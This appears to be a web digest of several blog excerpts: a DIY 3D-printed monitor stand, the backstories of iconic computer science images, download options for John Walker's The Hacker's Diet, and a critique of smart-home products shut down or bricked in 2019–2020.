my co-founder <a href="https://twitter.com/ivolo">Ilya</a> fulfilled this role.

<p>
While this is one of the simplest things I’ve made it’s also one of my favourites. All you need is a shelf or any other board cut to the correct size and access to a 3D printer. There are online services you can order 3D printed objects from if you don’t have access to a printer yourself. The advantage to using the Ikea shelf as I did is that it comes the perfect size and is already finished. Living in the city with easier access to Ikea than a workshop this is very convenient. If you do have a shop you could make the top out of anything you like.
</p>
<p><img src="https://www.iansmith.is/images/monitor-stand/monitor-stand-3d-model.png" alt="Monitor Stand 3D Model" title="Monitor Stand 3D Model"></p>
<p>Here’s the self I ordered from ikea: <a href="https://www.ikea.com/ca/en/p/svalnaes-shelf-bamboo-00322859/">Ikea SVALNÄS Shelf</a>. While waiting for it to ship I modeled some feet in Fusion360. My main requirements were that the stand has to hold my 27 inch monitor and it has to fit my midi keyboard underneath. I’ve uploaded the models for the feet on <a href="https://www.thingiverse.com/thing:4673014">Thingiverse</a>.</p>
<p><img src="https://www.iansmith.is/images/monitor-stand/monitor-stand-feet.jpeg" alt="Monitor Stand Feet" title="Monitor Stand Feet"></p>
<p>Once you have the feet printed and have the top all you’ll need is a drill and some screws. Set each foot in place and mark the holes. Then carefully pre-drill about halfway through the shelf. The Ikea shelf is particularly soft, it may even be somewhat hollow. You’ll want to make sure you don’t accidentally drill all the way through. I wrapped some painters tape around the drill bit to mark the depth. Once you have the holes drilled crew the feet into place and tighten by hand. The screws are only there to hold the feet in place and don’t actually take any weight so no need to over tighten them.</p>

December 2, 2020 | https://carolchen.me/blog/iconic-computer-science-images/ | <a href="https://web.archive.org/web/*/https://carolchen.me/blog/iconic-computer-science-images/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="js-article">
    
<p>Over the years I've noticed some images (not diagrams or graphs) that are recognizable to programmers. These images also often have backstories that contain educational information, so here they are! </p>
<h3 id="lena">Lena<a href="#lena" aria-label="Anchor link for: lena"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/lena.png" alt=""></p>
<p>Lena is a Swedish model and this photo of her is from a Playboy cover. Her name is sometimes spelled "Lenna" to encourage her name to be pronounced as "leh-nah" instead of "lee-nah", which is a mildly amusing parallel to classification tasks. The full image has her mostly nude. </p>
<p>The photo was first used six months after release in 1972 because of the mixture of textures and colours for testing an image compression algorithm. This eventually led to JPEGs (first released 1992). It's was standard to use the image to showcase differences between image compression algorithms .</p>
<p>For obvious reasons, having a nude model be the face of all image processing has raised concerns. Still there are blog posts, papers and websites that still use Lena for image processing, though recently it's been about computer vision, style transfer, etc. </p>
<h3 id="the-cornell-box">The Cornell Box<a href="#the-cornell-box" aria-label="Anchor link for: the-cornell-box"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/cornellbox.png" alt=""></p>
<p>Anyone who has taken a graphics course has seen this box as it was first presented at a SIGGRAPH in 1984. It consists of five planes, an overhead light, a rectangular prism and cube. Variations are often seen with spheres of different materials such as dielectrics (glass),  and metals instead of lambertians (the matte texture). </p>
<p>For a raytracer (or pathtracer) this tests a lot of important features. The shadowing of the rectangle onto the wall, contrasting wall colours that should emit some colour onto the white (this is called diffuse reflection). </p>
<p>As shown below, it can also showcase (or rather, suffer from) tone mapping, which is a technique used to map a set of colours to another to make the range look "dynamic" or at least correct. The image below has a bug where the lack of tonemapping causes the image to bug out where it tries to make the colour brighter than a pure white pixel. </p>
<p>Another issue with the image below is the noise, which can be fixed by more sampling in this specific case as it's a monte carlo ray tracer, so it uses some brute force and randomization as computers can't actually simulate light going in infinite directions. </p>
<p><img src="https://carolchen.me/blog/img/cs_images/badtracer.png" alt=""></p>
<p>Other classic rendering images include the Stanford bunny and the Utah teapot. It's been a meme to hide the Utah teapot into random scenes, and the teapot is the graphics version of "Hello World". It appears in Toy Story, the Simpsons, a Windows screensaver, and the Sims. Here's a <a href="https://www.youtube.com/watch?v=TIxt9guMbXo">2.5 minute video about the teapot from Tom Scott</a>. </p>
<p><img src="https://carolchen.me/blog/img/cs_images/bunny.png" alt=""></p>

<h3 id="the-big-red-mobile">The Big Red Mobile<a href="#the-big-red-mobile" aria-label="Anchor link for: the-big-red-mobile"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/bigred.jpeg" alt=""></p>
<p>CLRS! The iconic graphic on the textbook is obviously representative of a tree, but it's actually based on a piece of art. It was made by Alexander Calder in 1959. If you don't already know about mobiles, they're really cool, carefully engineered to work with equilibrium and air currents. Big Red, made from sheet metal and steel weird, can be found at the Whitney Museum of American Art! </p>
<p>Fun fact, Cormen (the C in CLRS) and co wanted to recolour the depiction to use red and black, but the Calder estate would not allow it. You can also purchase <a href="https://www.hangingmobilegallery.com/big-red-mobile/">similar versions of the mobile</a>.</p>
<h3 id="the-dragon-book-cover">The Dragon Book Cover<a href="#the-dragon-book-cover" aria-label="Anchor link for: the-dragon-book-cover"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/dragon.jpg" alt=""></p>
<p>This popular compilers textbook is often referred to as the "Dragon Book" because of the 🐉.The Dragon's shirt says "Complexity of Compiler Design", the shield says "Syntax Directed Translation" and the sword says "LALR Parser Generator". The older edition also has the knight riding a horse labeled "Data Flow Analysis". </p>
<p><img src="https://carolchen.me/blog/img/cs_images/greendragon.jpg" alt=""></p>
<h4 id="syntax-directed-translation">Syntax Directed Translation<a href="#syntax-directed-translation" aria-label="Anchor link for: syntax-directed-translation"> <i></i></a>
</h4>
<p>The shield describes a method where the compilation is guided by the parser, and describes a more simpler subset of compilers. Syntax directed translation is a method of implementation used on context-free grammars (there's a whole linguistics thing behind this, but it's mostly what it sounds like) as a Type 3 language (on the <a href="https://en.wikipedia.org/wiki/Chomsky_hierarchy#Type-2_grammars">Chomsky Heirarchy</a>) could not be driven by the parser. There aren't too many commonly used languages that would be described as completely context free though there are languages that only have small caveats to become CFGs (not to be confused with control flow graphs, another compilers concept). If you want to read more, this <a href="https://stackoverflow.com/questions/14589346/is-c-context-free-or-context-sensitive">Stack Overflow question</a> is a good start. </p>
<p>Anywho, this is likely the shield because it prevents any blurring of "execution" and "compilation" by not having any ambiguities embedded in the grammar. </p>
<h4 id="lalr-parser-generator">LALR Parser generator<a href="#lalr-parser-generator" aria-label="Anchor link for: lalr-parser-generator"> <i></i></a>
</h4>
<p>LALR is a type of parser (look ahead left to right) that is simpler than an LR parser (left to right, rightmost derivation) but more powerful than LL parsers (left to right, leftmost derivation). Parser generators greatly improve the pains of writing a parser. GCC started off with a parser generated (it's handwritten as of 2004), CPython makes their own LL* parser generator (*it's a bit variant, CPython devs may correct me), Haskell+OCaml+Ruby are on LALR generators. </p>
<p>Writing a nice parser that works, is fast <em>and</em> surfaces nice syntax errors is a difficult design task, and a bit tedious after designed! Hence the dragon will be slayed by a LALR parser generator (YACC is taught in the book). </p>
<h4 id="data-flow-analysis">Data Flow Analysis<a href="#data-flow-analysis" aria-label="Anchor link for: data-flow-analysis"> <i></i></a>
</h4>
<p>Data flow analysis is what it sounds like, tracking the movement of variables or other stored memory through a program. It is represented as the horse the knight is riding probably because it powers most things. I tried to think of why it might be removed from the cover, but there's no obvious answer and everything I came up with just sounded like a conspiracy theory. </p>
<h3 id="o-reilly-animals">O'Reilly Animals<a href="#o-reilly-animals" aria-label="Anchor link for: o-reilly-animals"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/animals.jpg" alt=""></p>
<p>Iconic meme-able book covers! But who draws them? Who picks the animals when the book is not just called Python? Why are they pictures of animals?</p>
<p>O'Reilly claims that this originated in the weirdness of Unix terms like awk, sed and yacc, and really the rest of it was "it just clicked". Many of them were drawn by one Lorrie LeJeune, and were done with pen and paper! There are also amusing stories of complaints from the arachnephobic who had to deal with spiders on covers. You can find a list of all the books and animals <a href="https://www.oreilly.com/animals.csp">here</a>.</p>
<p>Edie Freedman, the creative director who saw over this claimed that there's meaning to how all the animals that were selected though they aren't revealed. But here are some of the answers. </p>
<h4 id="the-obvious-ones">The Obvious Ones<a href="#the-obvious-ones" aria-label="Anchor link for: the-obvious-ones"> <i></i></a>
</h4>
<p>Many (but not all) of the Python books have snakes, Rust has a crab, OCaml has a Camel, GNU has a gnu. </p>
<h4 id="oracle-bugs">Oracle Bugs<a href="#oracle-bugs" aria-label="Anchor link for: oracle-bugs"> <i></i></a>
</h4>
<p>"Oracle Essentials" has a cicada, "Oracle Regular Expressions" have spiders, "Oracle 8i Internal Services" has a bumblebee, dragonfly, dung beetle, lady bug, lantern fly, leaf insect, ants, praying mantis, etc. <em>Very</em> consistently bugs. The speculation is often "oracle software bad" but its likely just a meaningless theme (with each animal having a deep meaning) and not meant to piss off Oracle. It is special as even Python is not consistently snakes, and other groups of books like Google, Regular Expressions, Javascript, etc, do not have any themes. </p>
<h4 id="perl-camel">Perl Camel<a href="#perl-camel" aria-label="Anchor link for: perl-camel"> <i></i></a>
</h4>
<p>Here's a weird one, as the obvious choice would be an oyster for the pearl. <a href="https://www.wsj.com/articles/SB870061922836237000">Wall Street Journal claims</a> that Larry Wall, creator of the language, wanted a camel because like Perl it's ugly but can go a long way without water. Some also claim it's a reference to the proverb "a camel is a horse designed by a committee" and how Perl is easily identifiable as a mixture of other languages. It's cool as the camel as adopted as Perl's mascot after the O'Reilly book. </p>
<h4 id="python-entirely-my-conspiracy">Python (entirely my conspiracy)<a href="#python-entirely-my-conspiracy" aria-label="Anchor link for: python-entirely-my-conspiracy"> <i></i></a>
</h4>
<p>Not all of the Python books have snakes! "Data Wrangling with Python" has a lizard, which seems to be a reference to giving Python "legs" to work with data. "Python Programming On Win32" is a crocdile, which to me just screams "PYTHON BUT MAKE IT SCARY". "Learning Python" is a rat and "Python Coobook" is a rabbit, which may be a reference to them being more introductory Python books as they're snake food. </p>
<h3 id="macos-powder-explosion-wallpaper">MacOS Powder Explosion Wallpaper<a href="#macos-powder-explosion-wallpaper" aria-label="Anchor link for: macos-powder-explosion-wallpaper"> <i></i></a>
</h3>
<p>MacOS has always had some iconic wallpapers, especially of California views so this one stood out to me as "this should be generated". This isn't related to programming but I thought I'd investigate it since I've always wanted to know. </p>
<p><img src="https://carolchen.me/blog/img/cs_images/explosion.png" alt=""></p>
<p>Apple explicitly scrubs EXIF data, which is all that microchip tracking metadata that are automatically attached to your images for location, time, device, shutter speeds, etc. The one time the EXIF was leaked on one image it had a bunch of nitpicking notes like "fill in this area close to the edge with more tree so it doesn’t create awkward negative shapes" and "darken some of the stars that are a bit smaller and darker, so there is a little more difference in the starfield" which I guess could be expected for the quality of the Apple wallpapers and the anxiety that comes with being the photographer for a MacOS wallpaper. </p>
<p>Spoiler alert, I didn't actually figure out if these were generated or photographed, but I did figure out <em>how</em> one would generate/photograph them, and that they are <em>very</em> probably photographed. Here is the precedence: photographed ethereal Apple productions. </p>
<p><img src="https://carolchen.me/blog/img/cs_images/applefancy.png" alt=""></p>
<h4 id="how-to-photograph">How to Photograph<a href="#how-to-photograph" aria-label="Anchor link for: how-to-photograph"> <i></i></a>
</h4>
<p>As expected, making these powder explosions would be a pain. One must first have the space, the high speed camera (powder flying through the air like that lasts less than a second) and cover all of the equipment. The powder is typically flour, and mixed with "holi" powder which is just high pigment powder for photoshoots/parties/crafts. It seems that many photographers actually have people in suits to throw the powder and those shots tend to look more like powder clouds than explosions. I found someone who did something a bit more clever, which involves a simple canon mechanism (silicon tubing and a pump) and sound triggered. </p>
<h4 id="how-to-render">How to Render<a href="#how-to-render" aria-label="Anchor link for: how-to-render"> <i></i></a>

<p>3D animation software of course would also enable you to do this, and in my opinion produces better results. </p>
<p>The general approach is to start with a sphere, create some noise outwards like a spiky ball. Turn those vectors into dots going out, then configure those …</p></section></div>

<h3><i>How to lose weight and hair through stress and poor nutrition</i></h3>
<address>
By
<a href="https://www.fourmilab.ch/" target="_top">John Walker</a>
</address>
</center>

<p>

<cite>The Hacker's Diet</cite>, notwithstanding its silly
subtitle, is a serious book about how to lose weight and
permanently maintain whatever weight you desire.  It
treats dieting and weight control from an <em>engineering</em>
and <em>management</em> standpoint, and provides the tools
and an understanding of why they work and how to use
them that permit the reader to gain control of their
own weight.  The book is intended primarily for busy,
successful engineers, programmers, and managers who
have struggled unsuccessfully in the past to lose
weight and avoid re-gaining it.
<a href="#Comptools">Computer-based tools</a>
and experiments in Microsoft Excel or the Palm Computing
Platform are available, as well as an online Web application,
but a computer is not necessary to use
the techniques described in the book; paper and pencil
alternatives are provided.

<h2><a href="https://www.fourmilab.ch/hackdiet/e4/">Fourth Edition (2005)</a></h2>

<p>
<a href="https://www.fourmilab.ch/hackdiet/e4/"><img src="https://www.fourmilab.ch/hackdiet/figures/hdpage4.png" width="256" height="288" alt=""></a>
The Fourth Edition of <cite>The Hacker's Diet</cite> was
released in November 2005.  It is essentially identical in content with the
previous editions, but has been extensively re-formatted to improve
appearance, accessibility, ease of navigation, and standards compliance.
The Fourth Edition strictly complies with the
<a href="http://www.w3.org/TR/xhtml1/" target="Hackdiet_Aux">XHTML&nbsp;1.0</a> (Transitional and Frameset)
and
<a href="http://www.w3.org/TR/CSS21/" target="Hackdiet_Aux">CSS&nbsp;2.1</a>
standards and requires a browser which implements these
standards.  (As of the release of this edition, current versions
of all of the most popular browsers, including Mozilla Firefox,
Opera, and Microsoft Internet Explorer supported these standards
sufficiently to display the book without problems.)  In addition, the
browser and operating system must display Unicode character entities.
JavaScript and DOM/DHTML are used in the navigation bar, but if they're
absent or disabled, everything will still work.  If your browser and/or
system cannot handle this version, the Third Edition (Frames) or the
No-Frame editions, both of which date from 1994, will almost certainly
work.  The content is the same; only the presentation is more rudimentary.

</p>

<h2><a name="epub" href="https://www.fourmilab.ch/hackdiet/epub/hackdiet.epub">EPUB Edition (2011)</a></h2>

The
<a href="http://en.wikipedia.org/wiki/EPUB" target="Hackdiet_Aux">EPUB</a>
edition is in the open document format
compatible with the iBooks application on the Apple iPad, iPhone, and
iPod&nbsp;touch; Sony Reader; Barnes and Noble Nook; and a variety of
other electronic book devices and mobile platforms.  EPUB books may be
opened directly with a Web browser using the
<a href="http://www.epubread.com/en/" target="Hackdiet_Aux">EPUBReader</a>
add-on for Firefox or the
<a href="http://widgets.opera.com/widget/15552/" target="Hackdiet_Aux">eBook
Reader</a>
widget for Opera, although users of desktop and notebook computers
with Internet connectivity will probably prefer the
<a href="https://www.fourmilab.ch/hackdiet/e4/">Web edition</a>,
due to its more flexible navigation options.
</p>

<p>
If your Web browser has an EPUB-compatible plug-in installed, you can
open the book simply by clicking on the
<a href="https://www.fourmilab.ch/hackdiet/epub/hackdiet.epub" target="Hackdiet_Aux"><cite>The
Hacker's Diet</cite> EPUB Edition</a>
link.  Otherwise, use your browser's idiom to download the
abovementioned file to your computer and then transfer it to your
reading device according to the manufacturer's directions.  For the
iPad and iPhone (etc.), just drag the downloaded
<tt>hackdiet.epub</tt> file to iTunes, where you should see it in the
“Books” section.  Then connect your reading device to the
computer and the book should be transferred to it by the Sync
process.  If the book is not installed, make sure that you've enabled
syncing books to that device, and that if you've opted not to sync all
books in your library to the device, that <cite>The Hacker's
Diet</cite> is checked to be copied.  You must also, of course, have
the Apple
<a href="http://en.wikipedia.org/wiki/IBooks" target="Hackdiet_Aux">iBooks</a>
application installed on the device; if it's missing, go to the App
Store and install it—it's free.
</p>

<p>
<cite>The Hacker's Diet</cite> EPUB edition contains no “Digital
Rights Management” constraints: you are free to install it on as
many devices as you wish, transfer it among them (if their hardware
and software so permit), and pass on copies to others.  It should be
compatible with any EPUB reader hardware and software which can open
standards-compliant unrestricted files.

If you prefer to read the book off-line, you can
<a href="https://www.fourmilab.ch/hackdiet/hdpdf.zip">download a PDF edition</a> (1.3 Mb, ZIP compressed)
which you
can read with the Adobe Reader utility,
available for most personal computers and Unix workstations,
which may be
<a href="http://get.adobe.com/reader/" target="Hackdiet_Aux">downloaded
free of charge</a> directly from the
<a href="http://www.adobe.com/" target="Hackdiet_Aux">Adobe Systems</a> Web site.
The PDF edition preserves all the formatting of
the original book, and permits point-and-click navigation
among chapters and to follow cross-references in the text.

Adobe is one of the most consistently irritating companies
on Earth with which to do business.  I'd like to give you
a nice button for downloading your own copy of Adobe Reader,
but they won't let me use the image without “registering”
and “licensing” it, which I'm certainly not going to do
in order to promote their product and its file format.

<h2><a href="https://www.fourmilab.ch/hackdiet/hdps.zip">PostScript Edition</a></h2>

<p>
<cite>The Hacker's Diet</cite> was originally typeset
using <a href="http://www.tug.org/" target="Hackdiet_Aux">TeX</a> with the
<a href="http://www.latex-project.org/" target="Hackdiet_Aux">LaTeX</a>
macro package.  Camera-ready copy was generated
from PostScript created by the <tt>dvips</tt>
utility.  The PostScript edition is a single monolithic
file, almost 2.7 megabytes, containing the
entire book as originally typeset.  You can read it on-line
with a PostScript viewing program such as
<a href="http://www.cs.wisc.edu/~ghost/">GhostScript</a>
(which is free), or print it on any PostScript-compatible
printer.  <strong>Before sending this
file to a printer, consider that the book is almost
250 pages long!</strong>  This is a <em>big</em> print
job, which will consume lots of paper, toner, and,
potentially, good will of any colleagues with whom
you share the printer.  The PostScript edition may be
downloaded as either a <a href="https://www.fourmilab.ch/hackdiet/hdps.zip">ZIPped archive</a>
or a <a href="https://www.fourmilab.ch/hackdiet/hackdiet.ps.gz"><b>gzip</b> compressed Unix <b>tar</b>
file</a>; both are 702 Kb in length and uncompress to a 2.7
Mb PostScript file.
</p>

<h2><a href="https://www.fourmilab.ch/hackdiet/www/hackdietf.html">Third Edition (1994 Web Edition with Frames)</a></h2>

<p>
If your browser supports frames but isn't up to the demands
of the Fourth Edition, the original 1994 Web edition with
frames remains available.
It allows navigation with
a panel which lets you click chapter titles and go
directly to that chapter.  If, in addition, your browser
supports JavaScript, simply moving the mouse over a
footnote icon, like this one:
<a onmouseover="javascript:footOver(0);" href="https://www.fourmilab.ch/hackdiet/www/f/0.html"><img src="https://www.fourmilab.ch/hackdiet/www/i/foot.gif" width="15" height="15" alt="[Footnote]"></a>
will pop up a window containing the footnote.  Moving the
mouse over other footnotes displays them in the auxiliary window.
Browsers without JavaScript (or users who have disabled
JavaScript in their browsers) may display footnotes in
the main document window by clicking the footnote icon,
then use their browser's “Back” button to return to the
main text.
</p>

<h2><a href="https://www.fourmilab.ch/hackdiet/www/hackdiet.html">No-Frame Web Edition</a></h2>

<p>
<a href="https://www.fourmilab.ch/hackdiet/www/hackdiet.html"><img src="https://www.fourmilab.ch/hackdiet/www/figures/any_browser.gif" width="88" height="31" alt="Works with Any Browser"></a>
Users with browsers which do not support frames, or those
who prefer a more linear presentation in a single
window, may access a no-frame edition of <cite>The Hacker's
Diet</cite> with identical content to the frame-based book.
The no-frame edition includes the pop-up footnotes present
in the frame edition, but since few browsers which lack
frames are likely to support JavaScript, you can simply click
on the footnote icon to display it, then use the
“Back” button or keystroke to return to the text containing
the footnote.

December 2, 2020 | https://blakeniemyjski.com/blog/disturbing-trends-in-smart-home-products-and-services/ | <a href="https://web.archive.org/web/*/https://blakeniemyjski.com/blog/disturbing-trends-in-smart-home-products-and-services/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><p>Over the last decade there has been some really great software products that
have been shut down with little to no warning. This is getting so common that
someone created a website called <a href="https://killedbygoogle.com/">Killed by Google</a>.
After Google <a href="http://googlereader.blogspot.com/2013/03/powering-down-google-reader.html">shutdown Reader in 2013</a>, I spent months trying to find a replacement.
During this research I determined I should try to find solutions to services
I use everyday that wouldn’t be shut down in some board room over profit
margins.</p><p>About five years ago, I started researching smart home products and services
as well as automation software to use in my next home. I started to notice the
following trends:</p><ul><li>Software products and services being shutdown with no notice</li><li>No software updates for promised features or security fixes</li><li>Software updates that remove out of the box functionality (features/bricking)</li><li>Free software that suddenly requires a paid subscription</li><li>Companies are selling or hording your data.</li></ul><p>For the sake of relevancy let’s just cover what’s happened since the start of
2019.</p><h2 id="2019">2019</h2><h3 id="ecobee">ecobee</h3><p>When ecobee launched the <a href="https://www.amazon.com/ecobee-Switch-Smart-Amazon-Built/dp/B0798LCLJ5?tag=niemyjski-20">ecobee Switch+</a>
I became super interested in them due to the shear amount of sensors in a small
device. They had also stated there would be API support as well as it would be
integrated as a remote temperature sensor for an
<a href="https://www.amazon.com/ecobee4-Thermostat-Built-Sensor-Included/dp/B08BZTPMW1?tag=niemyjski-20">ecobee smart thermostat</a>.</p><p>It took most of 2019, before 15 of my ecobee switches got the firmware update
to be added to my thermostat but the delivered promise of api support never came.</p><h3 id="best-buy-insignia-shut-down">Best Buy Insignia shut down</h3><p>Best Buy <a href="https://www.theverge.com/2019/9/6/20853671/best-buy-connect-insignia-smart-plug-wifi-freezer-mobile-app-shutdown-november-6">quietly announced on <strong>September 6th</strong></a>
that it was shutting down it’s Insignia brand of smart home devices on
<strong>November 6th</strong>. App access would no longer be available rendering most of the
products unusable.</p><blockquote><p>The announcement has already been purged from the Best Buy Insignia website.</p></blockquote><h3 id="lowe-s-iris-shut-down">Lowe’s Iris shut down</h3><p>Lowe’s Iris platform first launched in 2012, offered free and paid subscription
options. An <a href="https://www.theverge.com/2019/2/2/18208407/lowes-iris-smart-home-platform-shutting-down-march-2019">announcement on <strong>January 31st</strong></a>
that it was shutting down on <strong>March 31st</strong>, rendering devices dead.</p><p>I’m happy they offered a program to trade in any purchased devices for a
prepaid credit card so users could migrate to a different solution.</p><blockquote><p>The announcement has already been purged from the Lowe’s Iris website.</p></blockquote><h3 id="chamberlain-myq-breaking-api-changes">Chamberlain MyQ Breaking API Changes</h3><p>When it comes to automating garage door openers there are few out of the box
solutions that work and are as popular as the
<a href="https://www.amazon.com/Smart-Garage-Opener-Chamberlain-MYQ-G0301/dp/B075H7Z5L8?tag=niemyjski-20">Chamberlain MyQ Smart Garage Door Opener</a>.</p><p>An open source project created a python library that many other open source
projects use to integrate with MyQ using the MyQ Api. Unfortunately the MyQ
team has broken this <a href="https://github.com/arraylabs/pymyq/issues/27">api multiple times</a>
in 2019 causing automations to break.</p><blockquote><p>I hesitate a little bit every time I see an MyQ app update on my phone. as
I’m always wondering if this will trigger my opener firmware to be updated
and break my home automations.</p></blockquote><p>It’s been a cat and mouse game between smart home developers and the MyQ team.</p><h3 id="stringify-shut-down">Stringify shut down</h3><p>Stringify was launched in 2014 and bought by Comcast in 2017. Fast forward 18
months later to <strong>April 8th</strong>, Stringify <a href="https://www.howtogeek.com/410576/stringify-is-shutting-down-after-five-years/">announces via email</a>
it will be shutting down new sign ups immediately and all data will be deleted
on <strong>July 8th</strong>.</p><blockquote><p lang="en" dir="ltr">Stringify has announced that it will be shutting down in the upcoming months. <a href="https://t.co/VFshmwCeKK">https://t.co/VFshmwCeKK</a></p>— Stringify (@StringifyIt) <a href="https://twitter.com/StringifyIt/status/1115370840353202177?ref_src=twsrc%5Etfw">April 8, 2019</a></blockquote><h3 id="sonos-bricking-devices">Sonos bricking devices</h3><p>In <strong>December</strong> it was <a href="https://www.theverge.com/2019/12/30/21042871/sonos-recycle-mode-trade-up-program-controversy">uncovered</a>
that Sonos was bricking devices upon agreeing to recycle your device or by
upgrading the speaker.</p><blockquote><p>Recycle Mode is a state your device enters 21 days after recycling
confirmation in the Sonos app. In Recycle Mode, all data is erased and the
device is permanently deactivated so you can safely and securely dispose of
it. Once a device is in Recycle Mode, it cannot be reactivated.</p></blockquote><p>This decision was <a href="https://www.theverge.com/2020/3/5/21166777/sonos-ending-recycle-mode-trade-up-program-sustainability">overturned</a> in <strong>March 2020</strong>.</p><h3 id="works-with-nest-shut-down">Works with Nest shut down</h3><p>Google <a href="https://blog.google/products/google-nest/helpful-home/">announced</a> on
<strong>May 7th</strong> that it would be shutting down <code>Works with Nest</code> on <strong>August 31st</strong>.
It was only after massive backlash that they <a href="https://blog.google/products/google-nest/updates-works-with-nest/">announced</a>
that they would continue to support integrations until they were available in
the new API’s backed by a single Google Account.</p><p>Current users have to be super careful not to migrate their existing Nest
accounts to the new Google account for fear of losing integrations. I believe
this migration and integration support for various hubs will be completed in
2021.</p><h3 id="wink-product-availability">Wink product availability</h3><p>For over five months users in the Wink ecosystem couldn’t purchase any new
<a href="https://www.amazon.com/Wink-WNKHUB-2US-Smart-home-White/dp/B01KW8WGZQ?tag=niemyjski-20">Wink devices</a>
due to <a href="https://www.howtogeek.com/409925/why-we-cant-recommend-wink-hubs-anymore/">product availability issues</a>.
This lasted from <strong>November 2018</strong> through <strong>March 2019</strong>.</p><h2 id="2020">2020</h2><h3 id="august-connect-firmware">August Connect firmware</h3><p>In early 2020, I received a firmware update that caused all five of my
<a href="https://www.amazon.com/dp/B0752VPHVK?tag=niemyjski-20">August Smart Lock Pro Connect Hubs</a>
from connecting to my Wi-Fi. Slowly but surely they’ve came online but every
now and then I’ll have one drop offline. Thankfully I have the Z-Wave version
and access the locks that way.</p><h3 id="dark-sky-shut-down">Dark Sky shut down</h3><p>On <strong>March 31st</strong> <a href="https://www.theverge.com/2020/3/31/21201666/apple-acquires-weather-app-dark-sky-shut-down-android-wear-os-ios">Apple acquired Dark Sky</a>
and announced it would be shutting down it’s API at the end of <strong>2021</strong>. A lot
of smart home users used the API to power weather automations.</p><blockquote><p>Apple did the right thing by giving users plenty of time to move off of the API.</p></blockquote><h3 id="ecobee-1">ecobee</h3><p>As stated in the 2019 section, when remote thermostat sensors support was
rolled out to the <a href="https://www.amazon.com/ecobee-Switch-Smart-Amazon-Built/dp/B0798LCLJ5?tag=niemyjski-20">ecobee Switch+</a>
via an firmware update. A few months later it was removed with a second firmware
update. Now only some of my switches are paired as a remote sensor to my
<a href="https://www.amazon.com/ecobee4-Thermostat-Built-Sensor-Included/dp/B08BZTPMW1?tag=niemyjski-20">ecobee smart thermostats</a>.</p><p>To make matters worse there is an unresolved server side bug that keeps
renaming any switch that has a custom defined name back to the serial number of
the device. This should never happen to a consumer device paired with cloud
outages leaves a lot to be desired from ecobee when it comes to software.
I recommend using ecobee’s HomeKit support to get around these limitations
where possible.</p><h3 id="home-assistant-breaking-changes-and-os-changes">Home Assistant breaking changes and OS changes</h3><p>In <strong>May</strong> the Home Assistant team <a href="https://www.home-assistant.io/blog/2020/05/26/installation-methods-and-community-guides-wiki/">announced</a>
that they were dropping support for generic linux installs without consulting
the community. This was a major change that left many users frustrated. It makes
sense that users should be using the managed Home Assistant operating system,
but a large portion of users installed it on Ubuntu and other linux operating
systems of which may have been used for other purposes.</p><blockquote><p>As the platform matures there will be less churn and breaking changes.</p></blockquote><p>As we near the 1.0 release of Home Assistant, we’ve seen more integrations
be removed as well as changes to the API surface. Although these are good
changes they still require work by end users. This is to be expected of pre
version 1.0 software.</p><blockquote><p>Although breaking changes do happen from time to time. You control the
updates on your own time, helping to limit breaking changes.</p></blockquote><h3 id="chamberlain-myq-breaking-api-changes-1">Chamberlain MyQ breaking API changes</h3><p>For the second year running the <a href="https://www.amazon.com/Smart-Garage-Opener-Chamberlain-MYQ-G0301/dp/B075H7Z5L8?tag=niemyjski-20">Chamberlain MyQ Smart Garage Door Opener</a> has had issues due to MyQ trying lock out users
from using the MyQ API. It has been a cat and mouse game between smart home
developers and the MyQ team.</p><h3 id="tuya-firmware-locking">Tuya firmware locking</h3><p>I love <a href="https://blakeniemyjski.com/blog/securing-smart-home-devices-with-esphome-and-home-assistant/">flashing retail devices</a>
from the stock firmware to ESPHome. I do this mainly for privacy and to ensure it
can be brought into Home Assistant easily. It appears there is a
<a href="https://github.com/ct-Open-Source/tuya-convert/wiki/Collaboration-document-for-PSK-Identity-02">new firmware</a>
on some Tuya devices that is preventing flashing causing vendor lock in to
unknown third party services. I can’t blame companies for wanting to lock down
the firmware, it just leaves little options for smart home integrations when
the company leaves the space.</p><h3 id="logitech-harmony-express-remote-shut-down">Logitech Harmony Express remote shut down</h3><p>On <strong>July 9th</strong> Logitech <a href="https://support.logi.com/hc/en-us/community/posts/360048494053">announced</a>
it was discontinuing the 15 month old smart remote control that cost $250. It
would also be shutting down the Alexa service on <strong>September 30th</strong>, rendering
the device useless to control by it’s main selling feature.</p><blockquote><p>Logitech is offering a free upgrade if you bought this product!</p></blockquote><h3 id="wink-subscription">Wink Subscription</h3><p>On <strong>May 20th</strong> Wink <a href="https://blog.wink.com/wink-blog/2020/5/6/introducing-wink-subscription">announced</a>
that it would start charging all users $4.99 a month. Failure to subscribe
would result in severely limited functionality, pretty much forcing users to
upgrade in order to add or edit devices, add automations, or use voice control.</p><h3 id="ifttt-subscription">IFTTT Subscription</h3><p>On <strong>September 10th</strong> IFTTT <a href="https://ifttt.com/explore/introducing_ifttt_pro">announced</a>
a pro plan that costs $9.99 a month. The existing free plan would be severely
limited to 3 applets.</p><h3 id="smart-things-classic-shut-down">Smart Things Classic shut down</h3><p>On <strong>June 24th</strong> SmartThings <a href="https://community.smartthings.com/t/update-on-smartthings-classic-shutdown/213037">announced</a>
that SmartThings classic will be shutting down on <strong>December 1st</strong> . All users
who haven’t migrated to the new SmartThings API will have major disruptions
(e.g., your integrations will be deleted).</p><h3 id="wemo-cloud-only">Wemo cloud only</h3><p>On <strong>May 26th</strong> Wemo <a href="https://www.androidpolice.com/2020/05/26/wemo-is-replacing-its-awful-network-based-smart-home-management-with-online-accounts/">announced</a>
<code>Wemo Accounts</code>, a new way to manage all of your devices with an online account.</p><blockquote><p>The new account system shifts all of the device management away from your
local network and onto cloud services, which should reduce problems with the
Wemo apps and integrations with third-party services. However, account
creation is currently broken, which is very on-brand for Wemo.</p></blockquote><h2 id="conclusion">Conclusion</h2><p>It’s worth looking at all the services and products that were shut down and
disappeared like they never even existed. Some of these products and service
had amassed hundreds of thousands of users. Is there an emerging pattern? Would
you ever trust this company again?</p><p>I recommend buying devices that can be controlled locally though ESPHome, mqtt,
Thread, Zigbee or Z-Wave. Stay away from products that use a vendor specific
